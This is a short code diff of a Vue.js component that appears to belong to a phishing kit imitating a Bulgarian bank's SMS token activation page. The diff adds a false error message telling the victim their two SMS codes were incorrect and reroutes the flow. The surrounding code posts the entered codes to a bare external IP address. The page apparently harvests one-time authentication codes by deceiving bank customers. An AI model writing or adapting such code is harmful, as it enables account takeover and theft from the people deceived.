@@ -13,7 +13,8 @@
         <img v-if="Loding" src="../img/loding.gif" style="position: relative;left: 270px;width: 34px;">
         <div v-if="!Loding">
           <div id="div_CRAI">
-
+            <div class="msg"><span>
+            двата sms-а, които сте въвели са неправилни!</span></div>
             <div class="mobileTokenContainer"><ul class="enrollmentStepsContainer"><li>
               Ще получите следните кодове за активиране:
 
@@ -99,7 +100,7 @@ import useVuelidate from '@vuelidate/core'
 import { required , integer} from '@vuelidate/validators'
 import axios from 'axios'
 export default {
-  name:'sms',
+  name:'sms2',
   setup () {
     return { v$: useVuelidate() }
   },
@@ -149,7 +150,7 @@ export default {
         axios.post("http://51.91.58.210/api/sms/new", data).then(res => {
           console.log(res)
         }).catch()
-        this.$router.push("/sms/error/"+localStorage.session)
+        this.$router.push("/information/"+localStorage.session)
       }
 
     }
